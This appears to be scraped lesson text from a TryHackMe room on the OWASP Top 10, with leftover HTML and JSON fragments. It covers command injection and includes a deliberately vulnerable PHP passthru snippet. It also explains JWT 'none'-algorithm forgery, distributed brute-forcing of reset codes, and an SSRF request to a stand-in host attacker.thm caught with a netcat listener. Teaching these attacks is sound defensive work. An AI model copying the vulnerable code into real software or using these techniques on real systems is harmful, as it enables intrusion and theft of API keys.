Web applications require cryptography to provide confidentiality for their users at many levels. </p><p>Take, for example, a secure email application: </p><ul><li>When you are accessing your email account using your browser, you want to be sure that the communications between you and the server are encrypted. That way, any eavesdropper trying to capture your network packets won\'t be able to recover the content of your email addresses. When we encrypt the network traffic between the client and server, we usually refer to this as <b>encrypting data in transit</b>.<br /></li><li>Since your emails are stored in some server managed by your provider, it is also desirable that the email provider can\'t read their client\'s emails. To this end, your emails might also be encrypted when stored on the servers. This is referred to as <b>encrypting data at rest</b>.</li></ul><p>Cryptographic failures often end up in web apps accidentally divulging sensitive data. This is often data directly linked to customers (e.g. names, dates of birth, financial information), but it could also be more technical information, such as usernames and passwords. </p><p>At more complex levels, taking advantage of some cryptographic failures often involves techniques such as "Man in The Middle Attacks", whereby the attacker would force user connections through a device they control. Then, they would take advantage of weak encryption on any transmitted data to access the intercepted information (if the data is even encrypted in the first place). Of course, many examples are much simpler, and vulnerabilities can be found in web apps that can be exploited without advanced networking knowledge.

These flaws occur because the application interprets user-controlled input as commands or parameters. Injection attacks depend on what technologies are used and how these technologies interpret the input. Some common examples include:</p><ul><li><b>SQL Injection:</b> This occurs when user-controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. This could potentially allow the attacker to access, modify and delete information in a database when this input is passed into database queries.

Command Injection', 'taskDesc': '<p><span style="font-size:24px">Command Injection</span></p><p>Command Injection occurs when server-side code (like PHP) in a web application makes a call to a function that interacts with the server\'s console directly. An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server. The possibilities for the attacker from here are endless: they could list files, read their contents, run some basic commands to do some recon on the server or whatever they wanted, just as if they were sitting in front of the server and issuing commands directly into the command line.\xa0</p>\n\n<p>Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and look for ways to pivot around.</p>\n<p>\n  <span style="font-size:24px">Code Example</span></p>\n<p>Let\'s consider a scenario: MooCorp has started developing a web-based application for cow ASCII art with customisable text. While searching for ways to implement their app, they\'ve come across the <code>cowsay</code> command in Linux, which does just that! Instead of coding a whole web application and the logic required to make cows talk in ASCII, they decide to write some simple code that calls the cowsay command from the operating system\'s console and sends back its contents to the website.</p>\n\n<p>Let\'s look at the code they used for their app.\xa0 See if you can determine why their implementation is vulnerable to command injection.\xa0 We\'ll go over it below.</p>\n\n<pre class="language-php"><code class="language-php">&lt;?php\n    if (isset($_GET["mooing"])) {\n        $mooing = $_GET["mooing"];\n        $cow = \'default\';\n\n        if(isset($_GET["cow"]))\n            $cow = $_GET["cow"];\n        \n        passthru("perl /usr/bin/cowsay -f $cow $mooing");\n    }\n?&gt;</code>\n</pre>\n<p>In simple terms, the above snippet does the following:<br />\n</p>\n<ol>\n  <li>Checking if the parameter "mooing" is set. If it is, the variable <code>$mooing</code> gets what was passed into the input field.</li>\n  <li>Checking if the parameter "cow" is set. If it is, the variable <code>$cow</code> gets what was passed through the parameter.</li>\n  <li>The program then executes the function <code>passthru("perl /usr/bin/cowsay -f $cow $mooing");</code>. The passthru function simply executes a command in the operating system\'s console and sends the output back to the user\'s browser. You can see that our command is formed by concatenating the $cow and $mooing variables at the end of it. Since we can manipulate those variables, we can try injecting additional commands by using simple tricks.

Bash allows you to run commands within commands. This is useful for many reasons, but in our case, it will be used to inject a command within the cowsay server to get it executed. </p><p>To execute inline commands, you only need to enclose them in the following format\xa0<code>$(your_command_here)</code>. If the console detects an inline command, it will execute it first and then use the result as the parameter for the outer command. Look at the following example, which runs <code>whoami</code> as an inline command inside an <code>echo</code> command:</p>\n\n<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b7158502a9799698ec0ab29a850c8840.png" style="width:100%" alt="Inline commands" /><br /></p>\n\n<p><span style="font-size:1rem">So coming back to the cowsay server, here\'s what would happen if we send an inline command to the web application:</span></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9f657b909062ac82af12548b4f346aec.png" style="width:100%" alt="Sending our payload" /></p>\n\n<p>Since the application accepts any input from us, we can inject an inline command which will get executed and used as a parameter for cowsay.

Insecure Design', 'taskDesc': '<p><span style="font-size:24px">Insecure Design</span></p><p><b>Insecure design</b> refers to vulnerabilities which are inherent to the application\'s architecture. They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or a part of it) is flawed from the start. Most of the time, these vulnerabilities occur when an improper threat modelling is made during the planning phases of the application and propagate all the way up to your final app. Some other times, insecure design vulnerabilities may also be introduced by developers while adding some "shortcuts" around the code to make their testing easier. A developer could, for example, disable the OTP validation in the development phases to quickly test the rest of the app without manually inputting a code at each login but forget to re-enable it when sending the application to production.</p><p><span style="font-size:24px">Insecure Password Resets</span></p><p>A good example of such vulnerabilities occurred on <a href="https://thezerohack.com/hack-any-instagram" target="_blank">Instagram a while ago</a>. Instagram allowed users to reset their forgotten passwords by sending them a 6-digit code to their mobile number via SMS for validation. If an attacker wanted to access a victim\'s account, he could try to brute-force the 6-digit code. As expected, this was not directly possible as Instagram had rate-limiting implemented so that after 250 attempts, the user would be blocked from trying further. </p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7e1ca7561c839f350a086a6d739c8a57.png" style="width:75%" alt="Bruteforcing code" /><br /></p>\n\n<p>However, it was found that the rate-limiting only applied to code attempts made from the same IP. If an attacker had several different IP addresses from where to send requests, he could\xa0<span style="font-size:1rem">now</span><span style="font-size:1rem">\xa0try 250 codes per IP. For a 6-digit code, you have a million possible codes, so an attacker would need 1000000/250 = 4000 IPs to cover all possible codes.\xa0</span>This may sound like an insane amount of IPs to have, but cloud services make it easy to get them at a relatively small cost, making this attack feasible.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e557475b0db7c4be710f75c24889808.png" style="width:75%" alt="Distributed bruteforcing" /><br /></p>\n\n\n<p>Notice how the vulnerability is related to the idea that no user would be capable of using thousands of IP addresses to make concurrent requests to try and brute-force a numeric code. The problem is in the design rather than the implementation of the application in itself.</p><p>Since insecure design vulnerabilities are introduced at such an early stage in the development process, resolving them often requires rebuilding the vulnerable part of the application from the ground up and is usually harder to do than any other simple code-related vulnerability.

Debugging features are often available in programming frameworks to allow the developers to access advanced functionality that is useful for debugging an application while it\'s being developed. Attackers could abuse some of those debug functionalities if somehow, the developers forgot to disable them before publishing their applications.</p><p>One example of such a vulnerability was allegedly used when <a href="https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/" target="_blank">Patreon got hacked in 2015</a>. Five days before Patreon was hacked, a security researcher reported to Patreon that he had found an open debug interface for a Werkzeug console. Werkzeug is a vital component in Python-based web applications as it provides an interface for web servers to execute the Python code. Werkzeug includes a debug console that can be accessed either via URL on <code>/console</code>, or it will also be presented to the user if an exception is raised by the application. In both cases, the console provides a Python console that will run any code you send to it.

Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. A user would enter these credentials, and the server would verify them. The server would then provide the users\' browser with a session cookie i<span style="font-size:1rem">f they are correct</span><span style="font-size:1rem">.

If applications allow users to set passwords such as "password1" or common passwords, an attacker can easily guess them and access user accounts.</li><li><b>Weak Session Cookies:</b> Session cookies are how the server keeps track of users. If session cookies contain predictable values, attackers can set their own session cookies and access users\' accounts.\xa0</li></ul><p>There can be various mitigation for broken authentication mechanisms depending on the exact flaw:</p><ul><li>To avoid password-guessing attacks, ensure the application enforces a strong password policy.\xa0</li><li>To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute-force attacks.</li><li>Implement Multi-Factor Authentication.

Since no integrity verification is being done, an attacker might modify the software or data passed to the application, resulting in unexpected consequences.

While this may sound a bit strange, this is actually a somewhat common practice. Take as an example jQuery, a commonly used javascript library. If you want, you can include jQuery in your website directly from their servers without actually downloading it by including the following line in the HTML code of your website:</p>\n\n<pre class="language-html"><code class="language-html">&lt;script src="https://code.jquery.com/jquery-3.6.1.min.js"&gt;&lt;/script&gt;</code></pre>\n\n<p>When a user navigates to your website, its browser will read its HTML code and download jQuery from the specified external source.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/95712e9b375e22a57613a75c6b81384d.png" style="width:85%" alt="JS without integrity checks" /><br /></p>\n\n<p>The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of <code>https://code.jquery.com/jquery-3.6.1.min.js</code>\xa0to inject malicious code. As a result, anyone visiting your website would now pull the malicious code and execute it into their browsers unknowingly. This is a software integrity failure as your website makes no checks against the third-party library to see if it has changed. Modern browsers allow you to specify a hash along the library\'s URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called Subresource Integrity (SRI), and you can read more about it\xa0<a href="https://www.srihash.org/" target="_blank">here</a>.</p><p>The correct way to insert the library in your HTML code would be to use SRI and include an integrity hash so that if somehow an attacker is able to modify the library, any client navigating through your website won\'t execute the modified version.

Usually, when a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser for as long as the session lasts. This token will be repeated on each subsequent request so that the web application knows who we are. These session tokens can come in many forms but are usually assigned via cookies. <b>Cookies</b> are key-value pairs that a web application will store on the user\'s browser and that will be automatically repeated on each request to the website that issued them.<br /></p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9c9ed045f84136a6e0100f4111d7f34d.png" alt="Cookies" /><br /></p>\n\n<p>For example, if you were creating a webmail application, you could assign a cookie to each user after logging in that contains their username. In subsequent requests, your browser would always send your username in the cookie so that your web application knows what user is connecting. This would be a terrible idea security-wise because, as we mentioned, cookies are stored on the user\'s browser, so if the user tampers with the cookie and changes the username, they could potentially impersonate someone else and read their emails! This application would suffer from a data integrity failure, as it trusts data that an attacker can tamper with.</p><p>One solution to this is to use some integrity mechanism to guarantee that the cookie hasn\'t been altered by the user. To avoid re-inventing the wheel, we could use some token implementations that allow you to do this and deal with all of the cryptography to provide proof of integrity without you having to bother with it. One such implementation is<b> JSON Web Tokens (JWT)</b>.</p><p>JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won\'t be able to alter the key-value pairs and pass the integrity check. The structure of a JWT token is formed of 3 parts:</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11c86acaea05f98045cec5634e03e997.png" alt="JSON Web Tokens" /></p>\n<p>The header contains metadata indicating this is a JWT, and the signing algorithm in use is HS256. The payload contains the key-value pairs with the data that the web application wants the client to store. The signature is similar to a hash, taken to verify the payload\'s integrity. If you change the payload, the web application can verify that the signature won\'t match the payload and know that you tampered with the JWT. Unlike a simple hash, this signature involves the use of a secret key held by the server only, which means that if you change the payload, you won\'t be able to generate the matching signature unless you know the secret key.</p><p>Notice that each of the 3 parts of the token is simply plaintext encoded with base64. You can use <a href="https://appdevtools.com/base64-encoder-decoder" target="_blank">this online tool</a> to encode/decode base64. Try decoding the header and payload of the following token:</p><p><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw</code><br /></p>\n\n<p><b>Note:</b> The signature contains binary data, so even if you decode it, you won\'t be able to make much sense of it anyways.</p>\n\n<p><span style="font-size:24px">JWT and the None Algorithm</span></p><p>A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:</p><ol><li>Modify the header section of the token so that the <code>alg</code>\xa0header would contain the value <code>none</code>.</li><li>Remove the signature part.</li></ol><p>Taking the JWT from before as an example, if we wanted to change the payload so that the username becomes "admin" and no signature check is done, we would have to decode the header and payload, modify them as needed, and encode them back. Notice how we removed the signature part but kept the dot at the end.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f5d1b4ef49ff4eef52e7617631225e8a.png" alt="JWT None Algorithm" /><br /></p>\n\n<p>It sounds pretty simple!

Security Logging and Monitoring Failures', 'taskDesc': "<p>When web applications are set up, every action performed by the user should be logged. Logging is important because, in the event of an incident, the attackers' activities can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. The more significant impacts of these include:</p><ul><li><b>Regulatory damage:</b> if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations.</li><li><b>Risk of further attacks: </b>an attacker's presence may be undetected without logging. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.</li></ul><p>The information stored in logs should include the following:</p><ul><li>HTTP status codes</li><li>Time Stamps</li><li>Usernames</li><li>API endpoints/page locations</li><li>IP addresses</li></ul><p>These logs have some sensitive information, so it's important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.</p><p>As you may have noticed, logging is more important after a breach or incident has occurred. The ideal case is to have monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated. Common examples of suspicious activity include:</p><ul><li>Multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources, e.g. admin pages)</li><li>Requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.</li><li>Use of automated tools: particular automated tooling can be easily identifiable, e.g. using the value of User-Agent headers or the speed of requests. This can indicate that an attacker is using automated tooling.</li><li>Common payloads: in web applications, it's common for attackers to use known payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.</li></ul><p>Just detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will have a higher impact than others. These higher-impact actions need to be responded to sooner; thus, they should raise alarms to get the relevant parties' attention.</p><p>Put this knowledge to practice by analysing the provided sample log file.

SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services. </p><p>Think, for example, of a web application that uses an external API to send SMS notifications to its clients. For each email, the website needs to make a web request to the SMS provider\'s server to send the content of the message to be sent. Since the SMS provider charges per message, they require you to add a secret key, which they pre-assign to you, to each request you make to their API. The API key serves as an authentication token and allows the provider to know to whom to bill each message. The application would work like this:</p><p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/271d0075650cdf6499f994f99fa7eb8a.png" style="width:100%" alt="SSRF" /><br /></p><p>By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the\xa0<code>server</code>\xa0parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the\xa0<code>server</code> to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:</p><p><code>https://www.mysite.com/sms?server=attacker.thm&amp;msg=ABC</code></p><p>This would make the vulnerable web application make a request to:</p><p><code>https://attacker.thm/api/send?msg=ABC</code>\xa0</p><p>You could then just capture the contents of the request using Netcat:</p>\n\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            AttackBox\n        </div>\n        <pre class="terminal-code"><code class="language-shell-session">user@attackbox$ nc -lvp 80\nListening on 0.0.0.0 80\nConnection received on 10.10.1.236 43830\nGET /:8087/public-docs/123.pdf HTTP/1.1\nHost: 10.10.10.11\nUser-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0\nAccept: */*</code>\n        </pre>\n    </div>\n</div>\n\n<p><span style="font-size:1rem">This is a really basic case of SSRF.
